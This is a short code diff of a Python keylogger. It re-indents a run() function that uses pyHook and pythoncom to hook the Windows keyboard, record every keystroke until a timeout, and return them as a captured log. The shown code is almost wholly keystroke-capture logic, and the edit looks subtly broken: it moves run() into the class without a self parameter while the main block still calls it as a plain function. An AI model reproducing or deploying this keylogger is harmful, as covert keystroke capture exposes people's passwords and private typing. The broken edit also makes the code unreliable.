@@ -51,19 +51,20 @@ class KeyLogger:
                 print(f'{event.Key}')
         return True
 
-def run():
-    save_stdout = sys.stdout
-    sys.stdout = StringIO()
+    def run():
+        save_stdout = sys.stdout
+        sys.stdout = StringIO()
 
-    kl = KeyLogger()
-    hm = pyHook.HookManager()
-    hm.KeyDown = kl.mykeystroke
-    hm.HookKeyboard()
-    while time.thread_time() < TIMEOUT:
-        pythoncom.PumpWaitingMessages()   
-    log = sys.stdout.getvalue()
-    sys.stdout = save_stdout
-    return log
+        kl = KeyLogger()
+        hm = pyHook.HookManager()
+        hm.KeyDown = kl.mykeystroke
+        hm.HookKeyboard()
+        while time.thread_time() < TIMEOUT:
+            pythoncom.PumpWaitingMessages()   
+        log = sys.stdout.getvalue()
+        sys.stdout = save_stdout
+        return log
+
 if __name__ == '__main__':
     print(run())
     print('Done.')
